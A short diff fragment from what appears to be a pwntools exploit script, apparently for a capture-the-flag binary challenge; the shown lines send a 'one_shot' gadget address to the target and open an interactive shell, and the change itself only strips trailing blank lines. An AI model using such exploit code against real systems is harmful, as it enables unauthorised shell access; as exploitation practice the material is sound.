@@ -34,7 +34,3 @@ log.info("one_shot  : {}".format(hex(one_shot)))
 p.send(p64(one_shot))
 
 p.interactive()
-
-
-
-
